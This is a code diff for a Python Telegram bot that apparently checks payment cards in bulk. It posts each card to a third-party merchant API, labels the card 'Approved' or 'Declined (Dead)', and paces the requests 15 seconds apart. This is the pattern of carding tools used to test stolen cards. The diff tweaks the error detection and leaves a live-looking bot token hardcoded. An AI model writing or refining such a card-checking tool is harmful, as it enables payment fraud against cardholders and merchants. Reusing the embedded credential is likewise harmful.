@@ -8,7 +8,6 @@ import json
 BOT_TOKEN = "7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Global flag and lock for stopping the checking process
 stop_flag = False
 stop_lock = threading.Lock()
 
@@ -27,7 +26,7 @@ def check_single_card(card_text, chat_id):
     with stop_lock:
         if stop_flag:
             bot.send_message(chat_id, "🛑 Checking stopped by user.")
-            return False  # Signal to stop processing
+            return False
 
     card_data = parse_card_input(card_text)
     if not card_data:
@@ -92,6 +91,7 @@ def check_single_card(card_text, chat_id):
     try:
         br_resp = requests.post(br_url, headers=br_headers, json=br_json, timeout=30)
         br_resp.raise_for_status()
+        raw_text = br_resp.text
         br_json_resp = br_resp.json()
     except Exception as e:
         bot.send_message(chat_id, f"🔴 Error connecting to Bloomingriders API for card `{card_text}`:\n{str(e)}")
@@ -99,8 +99,9 @@ def check_single_card(card_text, chat_id):
 
     full_response = json.dumps(br_json_resp, indent=2, ensure_ascii=False)
 
-    if "error" in br_json_resp:
-        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\nError: {br_json_resp['error']}\n\nFull response:\n{full_response}"
+    # Check if the exact string '"error": ' exists in raw JSON text response
+    if '"error": ' in raw_text:
+        result_msg = f"❌ Card Declined (Dead) for `{card_text}`\n\nFull response:\n{full_response}"
     else:
         result_msg = f"✅ Card Approved (Success) for `{card_text}`\n\nFull response:\n{full_response}"
 
@@ -110,7 +111,7 @@ def check_single_card(card_text, chat_id):
 def process_cards(cards, chat_id):
     global stop_flag
     with stop_lock:
-        stop_flag = False  # Reset stop flag at start
+        stop_flag = False
 
     for idx, card in enumerate(cards):
         with stop_lock:
@@ -126,7 +127,6 @@ def process_cards(cards, chat_id):
         if not proceed:
             break
 
-        # Delay 15 seconds between cards except after last card or if stopped
         if idx != len(cards) - 1:
             for _ in range(15):
                 with stop_lock:
